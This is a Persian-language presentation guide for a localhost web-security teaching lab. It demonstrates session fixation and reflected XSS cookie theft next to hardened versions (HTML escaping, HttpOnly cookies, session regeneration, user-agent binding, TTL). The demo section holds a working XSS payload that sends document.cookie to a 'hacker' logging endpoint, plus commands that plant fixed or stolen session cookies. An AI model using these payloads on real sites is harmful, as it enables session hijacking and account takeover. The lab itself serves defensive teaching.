# 🎯 راهنمای ارائه - آزمایشگاه امنیت نشست v2.0

> این راهنما برای نمایش و ارائه آسیب‌پذیری‌های مدیریت نشست و احراز هویت طراحی شده است.

---

## 🆕 ویژگی‌های جدید Version 2.0

| ویژگی | توضیح |
|-------|-------|
| **Real XSS Attack** | Endpoint آسیب‌پذیر برای Reflected XSS |
| **Hacker Dashboard** | پنل نمایش کوکی‌های سرقت شده |
| **Session TTL** | منقضی شدن سشن بعد از ۵ دقیقه |
| **User-Agent Binding** | بایند شدن سشن به مرورگر |
| **IP Binding** | بایند شدن سشن به آدرس IP |

---

## 🚀 راه‌اندازی سریع

```powershell
cd "d:\iman\tmp\test prefect"
.venv\Scripts\activate
python main.py
```

---

## 📍 آدرس‌های مهم

| صفحه | آدرس |
|------|------|
| 🏠 صفحه اصلی | http://localhost:8000 |
| 🔴 لاگین آسیب‌پذیر | http://localhost:8000/vulnerable/login |
| 🟢 لاگین امن | http://localhost:8000/secure/login |
| 💀 پنل مهاجم | http://localhost:8000/hacker/dashboard |
| 🎯 دمو XSS | http://localhost:8000/vulnerable/xss-demo |
| 🔍 جستجوی آسیب‌پذیر | http://localhost:8000/vulnerable/search |
| 🔍 جستجوی امن | http://localhost:8000/secure/search |

**اطلاعات ورود:** `admin` / `123456`

---

## 🔴 دمو ۱: حمله Session Fixation (۵ دقیقه)

### مفهوم
مهاجم شناسه نشست را **قبل از لاگین** به قربانی می‌دهد.

### مراحل

1. **مهاجم لینک مخرب می‌سازد:**
   ```
   http://localhost:8000/vulnerable/login?token=EVIL_SESSION_123
   ```

2. **قربانی روی لینک کلیک می‌کند و لاگین می‌کند**

3. **مهاجم با همان توکن وارد می‌شود:**
   ```javascript
   // در DevTools Console
   document.cookie = "vulnerable_session=EVIL_SESSION_123"
   ```

4. **مهاجم به داشبورد دسترسی پیدا می‌کند:**
   ```
   http://localhost:8000/vulnerable/dashboard
   ```

---

## 🔵 دمو ۲: حمله XSS و سرقت کوکی (۱۰ دقیقه) 🆕

### مفهوم
این حمله **واقعی** است! مهاجم از طریق XSS کوکی قربانی را سرقت می‌کند.

### مراحل

#### مرحله ۱: قربانی لاگین می‌کند
```
http://localhost:8000/vulnerable/login
```
با `admin` / `123456` وارد شوید.

#### مرحله ۲: قربانی روی لینک مخرب کلیک می‌کند
```
http://localhost:8000/vulnerable/search?q=<script>fetch('/hacker/log?cookie='+document.cookie)</script>
```

#### مرحله ۳: مهاجم کوکی سرقتی را می‌بیند
به پنل مهاجم بروید:
```
http://localhost:8000/hacker/dashboard
```

**کوکی سرقت شده را خواهید دید! 💀**

#### مرحله ۴: مهاجم با کوکی سرقتی لاگین می‌کند
در مرورگر دیگر (Incognito):
```javascript
document.cookie = "vulnerable_session=STOLEN_COOKIE_VALUE"
```
سپس به داشبورد بروید:
```
http://localhost:8000/vulnerable/dashboard
```

### چرا این کار می‌کند؟
1. ❌ ورودی کاربر escape نمی‌شود → XSS
2. ❌ کوکی HttpOnly نیست → JavaScript می‌تواند بخواند
3. ❌ سشن به مرورگر بایند نشده → مهاجم می‌تواند استفاده کند

---

## 🟢 دمو ۳: محافظت‌های امنیتی (۵ دقیقه) 🆕

### تست ۱: XSS در نسخه امن
```
http://localhost:8000/secure/search?q=<script>alert('XSS')</script>
```
**نتیجه:** کد JavaScript اجرا نمی‌شود! (HTML Escaped)

### تست ۲: Session Hijacking در نسخه امن
حتی اگر مهاجم کوکی را داشته باشد:
```javascript
document.cookie = "secure_session=STOLEN_COOKIE"
```
**نتیجه:** اگر از مرورگر دیگر باشد، سشن نامعتبر می‌شود!

### تست ۳: Session TTL
بعد از ۵ دقیقه بدون فعالیت، سشن منقضی می‌شود.

---

## 📊 جدول مقایسه امنیتی v2.0

| ویژگی | نسخه آسیب‌پذیر | نسخه امن |
|-------|---------------|----------|
| XSS Protection | ❌ ورودی escape نمی‌شود | ✅ HTML Escaping |
| HttpOnly Cookie | ❌ JavaScript می‌تواند بخواند | ✅ JavaScript نمی‌تواند بخواند |
| Session Fixation | ❌ توکن URL پذیرفته می‌شود | ✅ Session Regeneration |
| Session TTL | ❌ بدون انقضا | ✅ ۵ دقیقه |
| User-Agent Binding | ❌ ندارد | ✅ مرورگر چک می‌شود |
| Session Hijacking | ❌ آسیب‌پذیر | ✅ محافظت شده |

---

## 🧪 تست خودکار

```powershell
python test_all_attacks.py
```

---

## ⏱️ زمان‌بندی ارائه

| بخش | زمان |
|-----|------|
| معرفی و مفاهیم | ۵ دقیقه |
| دمو Session Fixation | ۵ دقیقه |
| **دمو XSS و سرقت کوکی** | ۱۰ دقیقه |
| دمو محافظت‌های امن | ۵ دقیقه |
| بررسی کد و سوالات | ۵ دقیقه |
| **مجموع** | **۳۰ دقیقه** |

---

## 🛡️ راهکارهای امنیتی پیاده‌سازی شده

### ۱. XSS Protection
```python
# آسیب‌پذیر
html_content = f"<p>{user_input}</p>"  # ❌

# امن
import html
safe_input = html.escape(user_input)
html_content = f"<p>{safe_input}</p>"  # ✅
```

### ۲. HttpOnly Cookie
```python
response.set_cookie(
    key="session",
    value=session_id,
    httponly=True  # ✅ JavaScript نمی‌تواند بخواند
)
```

### ۳. Session Regeneration
```python
# پس از هر لاگین موفق
new_session_id = secrets.token_hex(32)  # ✅ شناسه جدید
```

### ۴. User-Agent Binding
```python
# ذخیره User-Agent هنگام لاگین
session.user_agent = request.headers.get("user-agent")

# بررسی در هر درخواست
if session.user_agent != current_user_agent:
    invalidate_session()  # ✅ سشن نامعتبر
```

### ۵. Session TTL
```python
SESSION_TTL_MINUTES = 5

if session_age > timedelta(minutes=SESSION_TTL_MINUTES):
    delete_session()  # ✅ سشن منقضی شده
```

---

## 📁 ساختار پروژه v2.0

```
test prefect/
├── main.py                 # نقطه ورود (v2.0)
├── database.py             # اتصال SQLite
├── models.py               # مدل‌ها (+ user_agent, ip_address)
├── dependencies.py         # TTL & User-Agent checks
├── utils.py                # هش رمز
├── requirements.txt
│
├── routers/
│   ├── vulnerable.py       # + XSS Search endpoint
│   ├── secure.py           # + Secure Search endpoint
│   └── hacker.py           # 🆕 پنل مهاجم
│
└── templates/
    ├── base.html
    ├── login.html
    ├── register.html
    └── dashboard.html
```

---

## ⚠️ هشدار اخلاقی

> این پروژه **صرفاً برای اهداف آموزشی** ساخته شده است.
> 
> استفاده از این تکنیک‌ها بر روی سیستم‌های دیگران **بدون اجازه، غیرقانونی** است.

---

## 📚 منابع

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Cookie Security](https://owasp.org/www-community/controls/SecureCookieAttribute)

---

ساخته شده با ❤️ برای آموزش امنیت وب - Version 2.0
